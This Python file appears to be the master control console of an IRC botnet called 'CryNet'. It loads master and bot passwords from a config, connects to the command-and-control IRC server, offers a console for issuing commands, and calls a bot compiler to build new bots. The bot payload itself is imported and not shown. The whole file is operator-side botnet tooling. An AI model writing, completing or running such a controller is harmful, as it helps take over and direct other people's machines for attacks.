import sys
import json
from colorama import init, Cursor

from BotCompiler import BotCompiler
from MasterIrcClient import MasterIrcClient
#from CommandCenter import CommandCenter

USER_INPUT = "Enter command: "
CONFIG_PATH = "resources/config.json"
class TerminalBuffer:
    def __init__(self):
        self.lines = []

    def write(self, message):
        sys.__stdout__.write(message)
        sys.__stdout__.flush()
        self.lines.append(message)
        if len(self.lines) > 1000:  # Limit buffer size if needed
            self.lines.pop(0)

    def flush(self):
        sys.__stdout__.flush()

    def getLastLine(self):
        return self.lines[-1] if self.lines else None

    def getLines(self):
        return self.lines

buffer = TerminalBuffer()
sys.stdout = buffer

def clearLine():
    sys.stdout.write(Cursor.UP(1) + '\r' + ' ' * 80 + '\r')

def loadConfig(configFile):
    with open(configFile, 'r') as f:
        config = json.load(f)
    return config

# END OF GLOBAL DECLARATIONS

def connectToIrcServer():
    global isConnected
    global ircClient
    global config
    ircClient = MasterIrcClient(config.get("server"), config.get("port"), config.get("masterValidatePass"), buffer, clearLine)

    attemptAutoConnect = input("Would you like to attempt an auto-validate and auto-register? (Y/N) ")
    isAutoConnecting = attemptAutoConnect == "Y" or attemptAutoConnect == "y"
    ircClient.connect(isAutoConnecting)
    if isAutoConnecting:
        print("If configuration is set correctly, then you should be validated and registered")
        print("Any errors will be flushed when starting an IRC console or command center")
    else:
        print("In order to validate and register to the IRC server, you now must do so via the IRC console or command center")
    isConnected = True
    print(f"Succesfully connected to {config.get('server')}")

def startCommandCenter():
    print("Not yet implemented!")
    #global isConnected
    #global ircClient
    #if not isConnected or ircClient == None:
    #    print("Must connect to IRC server first")
    #    return
    #commandCenter = CommandCenter(ircClient)
    #commandCenter.startCommandCenter()
    

def startIrcConsole():
    global isConnected
    global ircClient
    if not isConnected or ircClient == None:
        print("Must connect to IRC server first")
        return
    if not ircClient.isRunning():
        print("----------------------IRC CONSOLE----------------------") 
        print("Welcome to the IRC console, you can enter IRC server commands or general messages.")
        print("(Note: refer to `ServerCommands.md` in the docs folder of the CryNet repo for information on server commands)")
        print("Enter `QUIT_NOW` if you'd like to exist the IRC Console")
        print("Any server responses received before running will be outputted below: ")
        ircClient.run()

def startBotCompilation():
    global config
    compiler = BotCompiler(config.get("server"), config.get("botValidatePass"))
    compiler.start()
    #compiler.clean()

def displayMenu():
    print("~~~~~~~~~~~~~~~~~~~~~~~CryNet Master Options~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print("Master options (input number to select option): ")
    print("1. Connect to CryNet IRC server")
    print("2. Enter command center")
    print("3. Enter manual IRC console")
    print("4. View bot staistics")
    print("5. Compile a new bot")

def run(): # Better name?
    while True:
        displayMenu()
        option = input("Option: ").replace(" ", "")

        if option == "1":
            connectToIrcServer()
        elif option == "2":
            startCommandCenter()
        elif option == "3":
            startIrcConsole()  
        elif option == "4":
            print("Not yet implemented!")
        elif option == "5":
            startBotCompilation()
        else:
            print("Invalid option")

def main(): 
    tempConfig = loadConfig(CONFIG_PATH)

    global ircClient
    global isConnected
    global config
    isConnected = False
    ircClient = None
    config = {
        "server": tempConfig.get("server"),
        "port": tempConfig.get("port"),
        "masterValidatePass": tempConfig.get("masterValidatePass"),
        "botValidatePass": tempConfig.get("botValidatePass")
    }

    run() # run program
  
if __name__=="__main__":
    init() 
    main() 
